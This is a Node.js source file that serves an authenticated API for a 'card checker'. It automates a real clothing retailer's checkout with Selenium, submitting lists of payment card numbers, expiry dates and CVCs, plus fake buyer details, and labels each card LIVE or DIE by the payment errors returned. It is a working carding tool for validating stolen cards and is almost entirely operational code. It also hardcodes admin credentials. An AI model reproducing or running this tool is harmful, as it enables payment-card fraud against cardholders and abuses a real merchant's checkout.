import express from 'express';
import cors from 'cors'; // Importe o pacote cors
import { Builder, By, until, Select } from 'selenium-webdriver';
import chrome from 'selenium-webdriver/chrome.js';
import picocolors from 'picocolors';
import jwt from 'jsonwebtoken'; // Importando o JWT

const app = express();
const port = 8080; // Atualizado para rodar na porta 8080
const JWT_SECRET = process.env.JWT_SECRET || 'seuSegredoAqui'; // Chave secreta do JWT

let pageCounter = 0;
const pageLimit = 5;
// Habilitar CORS
app.use(cors()); // Isso permite todas as origens
app.use(express.json());

// Middleware de autenticação JWT
const authenticateJWT = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1]; // Extrai o token do cabeçalho

    if (!token) {
        return res.status(403).json({ message: 'Acesso negado, token não fornecido.' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ message: 'Token inválido ou expirado.' });
        }
        req.user = user; // Adiciona o usuário ao objeto de requisição
        next();
    });
};

// Function to perform card checking using Selenium WebDriver
async function cardTesting(cardInfo) {
    let card = cardInfo.split('|');
    let result;

    let options = new chrome.Options();
    options.addArguments('--log-level=3');
    options.addArguments('--disable-logging');
    options.addArguments('--no-sandbox');
    options.addArguments('--disable-gpu');
    options.addArguments('--incognito'); // Alternativa ao "inprivate" para Chrome

    let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();

    try {
        await driver.get('https://www.woolovers.us/product/AddYouMayAlsoLikeProduct?productId=26807');

        try {
            let cookiesAccept = await driver.wait(until.elementLocated(By.id('onetrust-accept-btn-handler')), 5000);
            if (cookiesAccept && await cookiesAccept.isDisplayed()) {
                await cookiesAccept.click();
            }
        } catch (error) {
            console.log('Botão de cookies não encontrado, continuando...');
        }

        result = await simulateCheckout(driver, card);

    } catch (error) {
        console.log(picocolors.red(`[ ERROR ] » ${cardInfo} » [ Erro ao processar: ${error.message} ]`));
        result = { status: 'ERROR', message: error.message };
    } finally {
        await driver.quit();
    }
    return result;
}

// Function to simulate checkout process
async function simulateCheckout(driver, card) {
    function getRandomLetters(length) {
        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        return Array.from({ length }, () => letters.charAt(Math.floor(Math.random() * letters.length))).join('');
    }

    function getRandomNumbers(length) {
        const numbers = '1234567890';
        return Array.from({ length }, () => numbers.charAt(Math.floor(Math.random() * numbers.length))).join('');
    }

    try {
        let checkout = await driver.wait(
            until.elementLocated(By.className('btn form-submit btn-primary btn-checkout js-checkout')),
            20000
        );
        await driver.executeScript("arguments[0].scrollIntoView(true);", checkout);
        await checkout.click();

        let inputMail = await driver.wait(until.elementLocated(By.id('RegisterEmailAddress')), 10000);
        let buttonSubmit = await driver.wait(until.elementLocated(By.xpath('//*[@id="register"]/form/div[3]/button')), 10000);
        await inputMail.sendKeys(`${getRandomLetters(10)}@hotmail.com`);
        await buttonSubmit.click();

        await driver.wait(until.elementLocated(By.xpath('//*[@id="lookupAddress"]/div[3]/p/span')), 10000).click();
        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[1]/input')), 10000).sendKeys(getRandomLetters(8));
        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[2]/input')), 10000).sendKeys(getRandomLetters(8));
        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[3]/input')), 10000).sendKeys(`202${getRandomNumbers(6)}`);
        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[4]/div[1]/input')), 10000).sendKeys('123 Main Street');
        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[4]/div[4]/input')), 10000).sendKeys('Houston');
        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[4]/div[6]/input')), 10000).sendKeys('Texas');
        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[4]/div[7]/input')), 10000).sendKeys('77002');
        await driver.wait(until.elementLocated(By.xpath('//*[@id="deliveryAddress"]/div[3]/div[2]/button')), 10000).click();

        await driver.wait(until.elementLocated(By.xpath('/html/body/div[3]/div/div[3]/div[1]/div/div[7]/div/div/div[2]/div[1]/div[1]/div[2]/div/label/span')), 10000).click();
        await driver.wait(until.elementLocated(By.xpath('/html/body/div[3]/div/div[3]/div[1]/div/div[9]/div/div/div[5]/div/div[1]/div/button')), 10000).click();

        await driver.wait(until.elementLocated(By.id('adyen-encrypted-form-number')), 10000).sendKeys(card[0].trim());
        let selectMonth = new Select(await driver.wait(until.elementLocated(By.id('adyen-encrypted-form-expiry-month')), 10000));
        let selectYear = new Select(await driver.wait(until.elementLocated(By.id('adyen-encrypted-form-expiry-year')), 10000));
        await selectMonth.selectByValue(card[1].trim());
        await selectYear.selectByValue(card[2].trim());
        await driver.wait(until.elementLocated(By.id('adyen-encrypted-form-cvc')), 10000).sendKeys(card[3].trim());
        await driver.wait(until.elementLocated(By.id('adyen-encrypted-form-holder-name')), 10000).sendKeys('Joseph Alex');

        await driver.wait(until.elementLocated(By.xpath('//*[@id="adyen-encrypted-form"]/div[6]/button')), 10000).click();

        let bodyText = await driver.findElement(By.tagName('body')).getText();
        if (bodyText.includes('Please enter a valid card number')) {
            return { status: 'INVALID', message: `${card.join('|')} [Insira um número de cartão válido]` };
        }
        else if (bodyText.includes('Please enter a valid expiry date')) {
            return { status: 'INVALID', message: `${card.join('|')} [Insira um ano de expiração válido]` };
        }

        let errorCard;
        try {
            errorCard = await driver.wait(
                until.elementLocated(By.css('.checkout-alerts--payment.alert.alert-danger')),
                20000
            );

            const alertText = await errorCard.getText();

            if (alertText.includes('CVC Declined')) {
                return { status: 'LIVE', message: `${card.join('|')} [${alertText}]` }; // Adiciona o número do cartão e motivo para LIVE
            } else if (alertText.includes('Not enough balance')) {
                return { status: 'LIVE', message: `${card.join('|')} [${alertText}]` }; // Adiciona o número do cartão e motivo para LIVE
            } else {
                return { status: 'DIE', message: `${card.join('|')} [${alertText}]` }; // Adiciona o número do cartão e motivo para DIE
            }
        } catch (error) {
            const currentUrl = await driver.getCurrentUrl();
            if (currentUrl.includes('https://www.woolovers.us/securecheckout/orderdetail?fail=true')) {
                return { status: 'DIE', message: `${card.join('|')} [VBV]` }; // Adiciona o número do cartão e motivo para VBV como DIE
            } else if (currentUrl.includes('unknown_page_url')) {
                return { status: 'UNKNOWN', message: `${card.join('|')} [Unknown Error]` }; // Adiciona o número do cartão e motivo para UNKNOWN
            } else {
                return { status: 'LIVE', message: `${card.join('|')} [Transaction Successful]` }; // Adiciona o número do cartão e motivo para transações bem-sucedidas
            }
        }
    } catch (error) {
        console.log(picocolors.red(`[ ERROR ] » ${card.join('|')} » [ ${error.message} ]`));
        return { status: 'ERROR', message: `${card.join('|')} [${error.message}]` };
    }
}

// API endpoint to handle card check requests, agora protegido por JWT
app.post('/api/check-card', authenticateJWT, async (req, res) => {
    const { cc } = req.body;

    if (!cc || !Array.isArray(cc)) {
        return res.status(400).json({ error: 'O parâmetro obrigatorio não foi inserido' });
    }

    try {
        const results = await Promise.all(cc.map(async (card) => {
            return await cardTesting(card);
        }));
        res.json(results);
    } catch (error) {
        res.status(500).json({ error: `Erro ao testar os cartões: ${error.message}` });
    }
});

// Endpoint para gerar o token JWT
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (username === 'admin' && password === 'admin123') { // Exemplo de autenticação
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' }); // Gera o token
        return res.json({ token });
    } else {
        return res.status(401).json({ message: 'Credenciais inválidas.' });
    }
});

// Start the server
app.listen(port, () => {
    console.log(`API rodando em http://localhost:${port}`);
});
